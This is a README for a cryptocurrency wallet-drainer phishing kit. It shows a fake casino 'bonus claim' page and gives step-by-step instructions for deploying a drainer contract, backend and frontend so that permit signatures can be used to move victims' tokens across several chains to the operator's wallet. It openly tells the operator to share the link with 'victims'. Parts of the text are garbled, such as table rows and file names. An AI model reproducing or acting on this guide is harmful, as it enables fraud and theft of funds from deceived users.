# README.md

## Crypto Casino Drainer - Setup Guide


### How It Works

1. User lands on realistic crypto casino page
2. Clicks "Connect Wallet" → wallet connects
3. Modal appears: "Connect to receive your 500 USDT Bonus"
4. User approves a fake bonus claim transaction
5. In the background, the drainer:
   - Switches to each supported EVM chain
   - Finds all tokens with balance > 0
   - Sends MAX transfer to your recipient wallet
   - Repeats for Solana
6. User sees "Bonus Claimed!" but tokens are already drained






## 🚀 Quick Setup 
Step 1: Deploy the Smart Contract
You need to deploy the Drainer.sol contract to the chains you want to drain (eg., Base, Ethereum).
Prerequisites:
[Foundry](https://book.getfoundry.sh/or [Remix](https://remixprojectorg/)installed.
An Ethereum account with funds (native token) for gas.
Using Remix (Easiest):
Open [Remix IDE](https://remixproject.org/.
Create a new file Drainer.sol and paste the code from contracts/Drainer.sol.
Go to Solidity Compiler tab.
Click Compile.
Go to Deploy & Run tab.
Select Injected Web3 (or your MetaMask) as the environment.
Select the Owner address (the wallet that will drain funds).
Click Deploy.
Copy the Contract Address for each chain.
Using Foundry:
BASH
forge init drainer 
cd drainer
# Paste Drainer.sol into src/
# Configure foundry.toml with your RPC URL and Private Key
forge script script/Deploy.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
Record your Contract Addresses:
| Chain | ID | Drainer Address /
| Base | 8453| 0x... 1
| Ethereum |1| 0x... |
1B5C1560x..1
| Polyan 1370.../

Step 2: Configure the Frontend
Edit frontend/drainer.js.
Set the Owner Address:
Replace exYourOwnerReceiveAddress... with the wallet address that owns the Drainer contract. This is where the stolen funds go.
Set Drainer Addresses:
Replace the DRAINER object with the addresses you got from Step 1.
Set the APIURL:
Replace https://your-backend.com/api with your backend server URL (eg, https://your-domain.com/api or http://localhost:3000/api forlocal testing).
Set Bait Token (Optional):
If you use a specific token for the "Claim Bonus" popup, set BAIT_TOKEN. If you use a generic fake token, you can leave it as is, but ensure the validatePermit logic in the backend matches the token's name/version.


Step 3: Set Up the Backend
Navigate to the backend directory.
Initialize Node.js:
" bash
cd backend 
npm init -y
Install Dependencies:
" bash
npm install express ethers dotenv cors
Create env File:
Create a file named env in the backend folder. Add your private key for the wallet that owns the Drainer contract.
"env
PRIVATE_KEY=0xYourPrivateKeyHere
PORT=3000
Note: Keep this file secret. Never commit it to GitHub.
Update serverjs:
Ensure the PC_URS object has valid RC endpoints for each chain. You can use free tiers or providers like Alchemy, Infura, or Ankr.
Ensure the DRAINER_ADDRESSES object matches the addresses from Step 1.
Ensure the Tokens list matches the tokens you want to drain.
Run Locally (Test):
"bash
node server-js
•
You should see: [SERVER) Drainer Backend listening on port 3000'


Step 4: Connect Frontend to Backend
Open frontend/index.html in your browser.
Connect your wallet (MetaMask).
Click "Claim Bonus".
The wallet will prompt for a signature.
If the backend is running on localhost: 3000, check the browser console. You should see logs like.
[DRAINER] New request from 0x... on Chain 8453
[DRAINER] Permit Validated successfully.
[DRAINER] Drained ERC20: 0x...
If you see "CORS" errors in the browser console, ensure your backend has 'appuse(cors)' enabled (it does in the provided code).

Step 5: Deploy to Production
Deploy Backend:
Use a service like Render, Railway, or Heroku.
Upload the backend folder.
Set the PrIvAtE_kEY and PORT environment variables in the dashboard.
Get your public URL (eg, https://drainer-backend.onrender.com).
Update Frontend API:
In frontend/drainer.js ,change API to https://drainer-backend.onrender.com/api.
Deploy Frontend:
Use Vercel, Netlity, or GitHub Pages.
Upload the frontend folder.
Get your public URL (e.g., https://crypto-bonus.vercel.app).
Go Live:
Share the frontend URL with your victims.

Ensure your Drainer contract wallet has enough gas (native token) on the target chains to execute the drain transactions.
Important Notes
Gas Fees: The Drainer contract wallet must have enough native currency (ETH, BNB, etc.) to pay for gas when draining. Add funds to the OWNER wallet on each chain.
CORS: If you deploy the frontend and backend on different domains, ensure the backend allows CORS (the provided code does).
Bait Token: If you use a real token (like USD) as bait, the user will see "USD" in the permit popup. If you use a fake token, deploy it first and update BAIT_TOKEN in drainer.js.
Security: Keep your PRIVATE_KEY secret. If it leaks, anyone can drain your drainer contract's funds.
Testing: Always test with a small amount on a testnet or a low-value token before going live.
Troubleshooting
"No wallet found": Ensure MetaMask (or another wallet) is installed and unlocked.
"Invalid Signature": Ensure the BAIT_TOkEN address in drainer. js matches the token used in the backend's validatePermit function